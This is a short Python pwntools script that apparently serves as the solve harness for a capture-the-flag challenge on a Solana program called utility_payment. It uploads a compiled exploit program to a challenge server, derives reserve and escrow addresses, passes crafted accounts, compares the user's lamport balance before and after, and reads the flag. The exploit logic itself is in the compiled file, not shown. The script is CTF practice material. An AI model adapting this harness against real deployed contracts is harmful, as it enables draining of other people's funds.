import os
from os.path import exists

so_file = "utility_payment_solve.so"

if not exists(so_file):
    os.system('make')

from pwn import args, remote
from solana.publickey import PublicKey
from solana.system_program import SYS_PROGRAM_ID

host = args.HOST or 'localhost'
port = args.PORT or 5000

r = remote(host, port)
solve = open(so_file, 'rb').read()
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.readuntil(b"program pubkey: ")
program_pubkey_str = r.readline(keepends=False).decode()
program_pubkey = PublicKey(program_pubkey_str)

r.readuntil(b"solve pubkey: ")
solve_pubkey_str = r.readline(keepends=False).decode()
solve_pubkey = PublicKey(solve_pubkey_str)

r.readuntil(b"user pubkey: ")
user_pubkey_str = r.readline(keepends=False).decode()
user_pubkey = PublicKey(user_pubkey_str)

print()
print("program: " + program_pubkey_str)
print("solve  : " + solve_pubkey_str)
print("user   : " + user_pubkey_str)
print()

# print("program: {program_pubkey}\nsolve: {solve_pubkey}\nuser: {user_pubkey}")

reserve, _ = PublicKey.find_program_address([b'RESERVE'], program_pubkey)
escrow, _ = PublicKey.find_program_address([b'ESCROW', bytes(user_pubkey)], program_pubkey)

r.recvuntil(b'user lamport before: ')
lamports_str = r.readline(keepends=False).decode()
print("user lamport before = " + lamports_str)

r.sendline(b'5')
r.sendline(b'x ' +  program_pubkey.to_base58())
r.sendline(b'ws ' + user_pubkey.to_base58())
r.sendline(b'w ' +  reserve.to_base58())
r.sendline(b'w ' +  escrow.to_base58())
r.sendline(b'x ' +  SYS_PROGRAM_ID.to_base58())

r.sendline(b'0')

r.recvuntil(b'user lamport after: ')
lamports_str = r.readline(keepends=False).decode()
print("user lamport after = " + lamports_str + "\n")


r.recvuntil(b'Flag: ')
print("Flag: ")
r.stream()
